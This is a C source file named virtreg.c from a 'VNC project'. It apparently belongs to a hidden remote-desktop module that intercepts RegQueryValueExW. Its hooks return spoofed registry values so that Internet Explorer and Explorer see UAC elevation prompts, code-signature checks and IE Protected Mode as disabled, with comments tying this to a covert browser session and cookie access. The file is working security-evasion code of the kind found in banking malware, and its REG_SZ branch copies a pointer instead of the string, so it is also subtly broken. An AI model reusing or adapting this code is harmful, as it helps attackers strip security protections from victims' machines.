//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: virtreg.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Tue, 23 Jul 2013) $
// description:
//	registry keys virtualization

#include "project.h"
#include "rt\reg.h"

#define REG_KEY_TYPE_MACHINE 1
#define REG_KEY_TYPE_USER    2
#define REG_KEY_BEGIN_WITH   0x80000000

#define REG_ACTION_RETURN_VALUE     1
#define REG_ACTION_RETURN_NOT_FOUND 2

#define szRegMachine     L"\\Registry\\Machine"
#define szRegMachineSize sizeof("\\Registry\\Machine")-1
#define szRegUser        L"\\Registry\\USER"
#define szRegUserSize    sizeof("\\Registry\\USER")-1

typedef struct _REG_HOOK_DEFINITION
{
	LPWSTR ValueName;
	LPWSTR KeyName;
	DWORD  KeyNameSize; // for REG_KEY_BEGIN_WITH

	DWORD  KeyType; //REG_KEY_TYPE_MACHINE,REG_KEY_TYPE_USER
	DWORD  ValueType; //REG_DWORD, etc
	DWORD  ValueSize;
	struct  
	{
		DWORD  vDword;
		LPWSTR vSrting;
	}Value;
	DWORD  Action;
}REG_HOOK_DEFINITION,*PREG_HOOK_DEFINITION;

static const LPWSTR g_szEmpty = L"";

static REG_HOOK_DEFINITION RegHooksSystem[] = 
{

	//////////////////////////////////////////////////////////////////////////
	// UAC
	// http://www.askvg.com/how-to-tweak-user-account-control-uac-options-in-windows-vista-home-basic-home-premium/

	// EnableLUA specifies whether Windows® User Account Controls (UAC) 
	// notifies the user when programs try to make changes to the computer. 
	// UAC was formerly known as Limited User Account (LUA).

	// the problem: if UAC is on, ie uses Cookies\Low directory to load cookies
	//              if UAC is off, it uses Cookies directory to load cookies
	// so, if UAC is on on host ie will be use different cookies dir in session
	// we have to disable this value virtualization until find the case when it's important
	//{
	//	L"EnableLUA",
	//	L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
	//	cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
	//	REG_KEY_TYPE_MACHINE,
	//	REG_DWORD,
	//	sizeof(DWORD),
	//	{0,NULL},
	//	REG_ACTION_RETURN_VALUE
	//},

	// The following is equal to the Security Policy 
	// "User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode" = 
	// "Elevate without prompting"
	{
		L"ConsentPromptBehaviorAdmin",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// The following is equal to the Security Policy 
	// User Account Control: Behavior of the elevation prompt for standard users
	{
		L"ConsentPromptBehaviorUser",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{3,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// The following is equal to the Security Policy 
	// "User Account Control: Allow UIAccess applications to prompt for elevation without using the secure dekstop" = "Enabled"
	{
		L"EnableUIADesktopToggle",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{1,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// User Account Control: Detect application installations and prompt for elevation
	// To Disable - 0
	{
		L"EnableInstallerDetection",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// User Account Control: Only elevate executables that are signed and validated
	// To Disable - 0
	{
		L"ValidateAdminCodeSignatures",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// User Account Control: Only elevate UIAccess applications that are installed in secure locations
	// To Disable - 0
	{
		L"EnableSecureUIAPaths",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// User Account Control: Switch to the secure desktop when prompting for elevation
	// To Disable - 0
	{
		L"PromptOnSecureDesktop",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// User Account Control: Admin Approval Mode for the Built-in Administrator account
	// Disable - 0
	{
		L"FilterAdministratorToken",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	{
		0
	}
};

//////////////////////////////////////////////////////////////////////////
// ie settings
// http://www.geoffchappell.com/studies/windows/ie/iertutil/api/mic/isprotectedmodeenabledforie.htm
static REG_HOOK_DEFINITION RegHooksIE[] = 
{
	// Version 8.0 allows protected mode to be disabled in the registry, 
	// through the following value in any of four keys listed below in order of decreasing precedence
	{
		L"ProtectedModeOffForAllZones",
		L"SOFTWARE\\Policies\\Microsoft\\Internet Explorer\\Low Rights",
		cstrlenA("SOFTWARE\\Policies\\Microsoft\\Internet Explorer\\Low Rights"),
		REG_KEY_TYPE_MACHINE | REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	{
		L"ProtectedModeOffForAllZones",
		L"Software\\Microsoft\\Internet Explorer\\Low Rights",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\Low Rights"),
		REG_KEY_TYPE_MACHINE | REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	{
		L"LuaOffLoRIEOn",
		L"Software\\Microsoft\\Internet Explorer\\Low Rights",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\Low Rights"),
		REG_KEY_TYPE_MACHINE | REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	//forcing Internet Explorer to always show Menu bar:
	{
		L"AlwaysShowMenus",
		L"Software\\Policies\\Microsoft\\Internet Explorer\\Main",
		cstrlenA("Software\\Policies\\Microsoft\\Internet Explorer\\Main"),
		REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{1,NULL},
		REG_ACTION_RETURN_VALUE
	},
	//forcing Internet Explorer to always show Menu bar:
	{
		L"AlwaysShowMenus",
		L"Software\\Microsoft\\Internet Explorer\\MINIE",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\MINIE"),
		REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{1,NULL},
		REG_ACTION_RETURN_VALUE
	},
	{
		L"AlwaysShowMenus",
		L"Software\\Microsoft\\Internet Explorer\\Main",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\Main"),
		REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{1,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// To Turn Off Enhanced Protected Mode in your IE10 or IE11
	{
		L"Isolation",
		L"Software\\Microsoft\\Internet Explorer\\Main",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\Main"),
		REG_KEY_TYPE_USER,
		REG_SZ,
		sizeof("PMIL"),
		{0,L"PMIL"},
		REG_ACTION_RETURN_VALUE
	},
	// disable Save As dialog opening on winxp
	// in our case that delay blocks window
	// SHDOCVW!SafeOpenDlgProc WM_NCACTIVATE
	// IE6
	{
		L"DownloadActivationDelay",
		L"Software\\Microsoft\\Internet Explorer\\Download",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\Download"),
		REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// IE7
	// code has been moved to ieframe.dll
	// key name and value name have been modified
	{
		L"SecurityDialogActivationDelay",
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
		cstrlenA("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"),
		REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_VALUE
	},
	{
		0
	}
};

//////////////////////////////////////////////////////////////////////////
// explorer
static REG_HOOK_DEFINITION RegHooksExplorer[] = 
{
	//HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell\EdgeUI
	//DisableCharmsHint=1
	//DisabledEdges=f
	//DisableTLcorner=1

	//All visual effects are Off
	{
		L"VisualFXSetting",
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects",
		cstrlenA("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects"),
		REG_KEY_TYPE_MACHINE | REG_KEY_TYPE_USER,
		REG_DWORD,
		sizeof(DWORD),
		{2,NULL},
		REG_ACTION_RETURN_VALUE
	},
	//
	// Special magic from TRAY / EXPLORER - It wants to know if
	// there is already a taskman window installed so it can fix
	// itself if there was some sort of explorer restart.
	//
	{
		L"ShutdownTime",
		L"SYSTEM\\CurrentControlSet\\Control\\Windows",
		cstrlenA("SYSTEM\\CurrentControlSet\\Control\\Windows"),
		REG_KEY_TYPE_MACHINE,
		REG_BINARY,
		sizeof(DWORD),
		{0,NULL},
		REG_ACTION_RETURN_NOT_FOUND
	},

	// desktop settings
	{
		L"NoActiveDesktop",
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies",
		cstrlenA("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"),
		REG_KEY_TYPE_MACHINE,
		REG_DWORD,
		sizeof(DWORD),
		{1,NULL},
		REG_ACTION_RETURN_VALUE
	},
	// no wallpaper
	{
		L"Wallpaper",
		L"Control Panel\\Desktop",
		cstrlenA("Control Panel\\Desktop"),
		REG_KEY_TYPE_USER,
		REG_SZ,
		sizeof(L""),
		{0,L""},
		REG_ACTION_RETURN_NOT_FOUND
	},
	{
		L"WallpaperSource",
		L"Software\\Microsoft\\Internet Explorer\\Desktop\\General",
		cstrlenA("Software\\Microsoft\\Internet Explorer\\Desktop\\General"),
		REG_KEY_TYPE_USER,
		REG_SZ,
		sizeof(L""),
		{0,L""},
		REG_ACTION_RETURN_NOT_FOUND
	},
	{
		L"NoWindowMinimizingShortcuts",
		L"Software\\Policies\\Microsoft\\Windows\\Explorer",
		cstrlenA("Software\\Policies\\Microsoft\\Windows\\Explorer"),
		REG_KEY_TYPE_USER,
		REG_SZ,
		sizeof(L""),
		{1,L""},
		REG_ACTION_RETURN_VALUE
	},

	// disables chrome indirect launch (using com stub server)
	{
		L"DelegateExecute",
		L"SOFTWARE\\Classes\\Chrome",
		cstrlenA("SOFTWARE\\Classes\\Chrome"),
		REG_KEY_TYPE_MACHINE | REG_KEY_BEGIN_WITH,
		REG_SZ,
		sizeof(L""),
		{0,L""},
		REG_ACTION_RETURN_NOT_FOUND
	},
	{
		0
	}
};

#define REG_HOOK_SYSTEM   0
#define REG_HOOK_IE       1
#define REG_HOOK_EXPLORER 2

// returns full key name for key handle and subkey (optional, can be NULL)
LPWSTR GetFullKeyName(HANDLE hKey,LPWSTR szSubKeyName)
{
	LPWSTR szFullKeyName = NULL;
	LPWSTR szKeyName = NULL;
	int SubKeyNameLen = 0;
	int KeyNameLen = 0;
	
	if ( szSubKeyName ) {
		SubKeyNameLen = lstrlenW(szSubKeyName);
	}
	szKeyName = RegQueryKeyNameW(hKey);
	if ( szKeyName )
	{
		if ( SubKeyNameLen )
		{
			KeyNameLen = lstrlenW(szKeyName);
			if ( KeyNameLen )
			{
				szFullKeyName = hAlloc((KeyNameLen+SubKeyNameLen+2)*sizeof(WCHAR)); //+ \\ + /0
				if ( szFullKeyName )
				{
					lstrcpyW(szFullKeyName,szKeyName);
					if ( szKeyName[KeyNameLen-1] != L'\\' ){
						lstrcatW(szFullKeyName,L"\\");
					}
					lstrcatW(szFullKeyName,szSubKeyName);
				}
			}
			hFree ( szKeyName );
		}
		else
		{
			szFullKeyName = szKeyName;
		}
	}
	return szFullKeyName;
}

// looks up hook by key and value
WINERROR 
	RegFindHookInternal(
		IN PREG_HOOK_DEFINITION Hooks,
		IN HANDLE hKey,
		IN LPWSTR szSubKeyName, // can be NULL
		IN LPCWSTR lpValueName,
		OUT PREG_HOOK_DEFINITION *ppHOOK
		)
{
	WINERROR Error = ERROR_FILE_NOT_FOUND;
	BOOL fbFound = FALSE;	
	LPWSTR szFullKeyName = NULL;
	PREG_HOOK_DEFINITION Hook;

	for ( Hook = Hooks; Hook->ValueName; Hook++ )
	{
		if ( lstrcmpiW(lpValueName,Hook->ValueName) == 0 )
		{
			BOOL KeyTypeMatch = FALSE;
			LPWSTR szShortKeyName = NULL;

			if ( szFullKeyName == NULL ){
				// get full key path
				szFullKeyName = GetFullKeyName(hKey,szSubKeyName);
				if ( !szFullKeyName ){
					DbgPrint("!szFullKeyName, value=%S\n",lpValueName);
					Error = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
			}

			if ( StrCmpNIW (szFullKeyName,szRegMachine,szRegMachineSize) == 0 &&
				((Hook->KeyType & REG_KEY_TYPE_MACHINE ) == REG_KEY_TYPE_MACHINE ))
			{
				//\\Registry\\Machine\\Software\\XXX -> Software\\XXX
				szShortKeyName = szFullKeyName+szRegMachineSize+1;
				KeyTypeMatch = TRUE;
			}
			else if ( StrCmpNIW (szFullKeyName,szRegUser,szRegUserSize) == 0 &&
				((Hook->KeyType & REG_KEY_TYPE_USER ) == REG_KEY_TYPE_USER ))
			{
				//\\Registry\\Users\\S-1-5-20\\Software\\XXX -> Software\\XXX
				LPWSTR szTmpKeyName;
				szShortKeyName = szFullKeyName+szRegUserSize+1;
				szTmpKeyName = wcschr(szShortKeyName,L'\\');
				if ( szTmpKeyName ){
					szShortKeyName = szTmpKeyName + 1;
				}
				KeyTypeMatch = TRUE;
			}
			// check key name
			if ( KeyTypeMatch )
			{
				if ( (Hook->KeyType & REG_KEY_BEGIN_WITH ) == REG_KEY_BEGIN_WITH )
				{
					if( StrCmpNIW(Hook->KeyName,szShortKeyName,Hook->KeyNameSize)==0){
						Error = NO_ERROR;
						break;
					}
				}
				else if( lstrcmpiW(Hook->KeyName,szShortKeyName)==0)
				{
					Error = NO_ERROR;
					break;
				}
			}
		}
	}

	if ( szFullKeyName ){
		hFree( szFullKeyName );
	}
	if ( Error == NO_ERROR ){
		*ppHOOK = Hook;
	}
	return Error;
}

// looks up system and application specific hooks
WINERROR 
	RegFindHook(
		IN HANDLE hKey,
		IN LPWSTR szSubKeyName, // can be NULL
		IN LPWSTR lpValueName,
		OUT PREG_HOOK_DEFINITION *ppHOOK,
		IN BOOL bIE, BOOL bShell
		)
{
	WINERROR Error = NO_ERROR;
	PREG_HOOK_DEFINITION Hook = NULL;

	// look in system hooks
	Error =
		RegFindHookInternal(
			RegHooksSystem,
			hKey,
			szSubKeyName, // can be NULL
			lpValueName,
			&Hook
			);
	if ( Error == ERROR_FILE_NOT_FOUND )
	{
		if ( bIE ){
			Error =
				RegFindHookInternal(
					RegHooksIE,
					hKey,
					szSubKeyName, // can be NULL
					lpValueName,
					&Hook
					);
		}
		else if ( bShell )
		{
			Error =
				RegFindHookInternal(
					RegHooksExplorer,
					hKey,
					szSubKeyName, // can be NULL
					lpValueName,
					&Hook
					);
		}
	}

	if ( Error == NO_ERROR ){
		*ppHOOK = Hook;
	}
	return Error;
}

// function that we call before the original RegQueryValueExW
BOOL 
	RegQueryValueExW_Before(
		IN HKEY hKey,
		IN LPWSTR lpSubKey,
		IN LPWSTR lpValueName,
		OUT LPDWORD lpType,
		OUT LPBYTE lpData,
		OUT LPDWORD lpcbData,
		OUT LPLONG ErrorCode,
		IN BOOL bIE, BOOL bShell
		)
{
	WINERROR Error = NO_ERROR;
	PREG_HOOK_DEFINITION Hook = NULL;
	BOOL fbResult = TRUE;

	// sanity checks
	if ( lpcbData == NULL && lpData != NULL ){
		*ErrorCode = ERROR_INVALID_PARAMETER;
		return TRUE; // call orig
	}

	if ( lpcbData == NULL && lpData == NULL ){
		*ErrorCode = ERROR_INVALID_PARAMETER;
		return TRUE; // call orig
	}

	// get hook for this key and value
	Error = 
		RegFindHook(
			hKey,
			lpSubKey, // can be NULL
			lpValueName,
			&Hook,
			bIE, bShell
			);

	if ( Error == NO_ERROR )
	{
		if ( Hook->Action == REG_ACTION_RETURN_NOT_FOUND ){
			DbgPrint("ret not found value=%S\n",lpValueName);
			*ErrorCode = ERROR_FILE_NOT_FOUND;
			fbResult = FALSE;
		}
		else if ( lpcbData != NULL && lpData == NULL )
		{
			DbgPrint("lpcbData != NULL && lpData == NULL value=%S\n",lpValueName);

			*((PDWORD)(lpcbData)) =Hook->ValueSize;
			*ErrorCode = ERROR_SUCCESS;
			fbResult = FALSE;
		}
		else if ( *((PDWORD)(lpcbData)) < Hook->ValueSize )
		{
			DbgPrint("*((PDWORD)(lpcbData)) < RegHooks[i].ValueSize value=%S\n",lpValueName);

			*((PDWORD)(lpcbData)) = Hook->ValueSize;
			*ErrorCode = ERROR_MORE_DATA;
			fbResult = FALSE;
		}
		else
		{
			if ( lpcbData != NULL ){
				*((PDWORD)(lpcbData)) = Hook->ValueSize;
			}

			if ( lpData != NULL ){
				if ( Hook->ValueType == REG_DWORD ){
					*((PDWORD)(lpData)) = Hook->Value.vDword;
				}else if ( Hook->ValueType == REG_SZ ){
					memcpy(lpData,&Hook->Value.vSrting,Hook->ValueSize);
				}else{
					ASSERT(FALSE);
				}
			}

			if ( lpType != NULL ){
				*((PDWORD)(lpType)) = Hook->ValueType;
			}

			*ErrorCode = ERROR_SUCCESS;
			fbResult = FALSE;
		}
	}
	else if ( Error != ERROR_FILE_NOT_FOUND )
	{
		*ErrorCode = Error;
		fbResult = FALSE;
	}
	return fbResult;
}

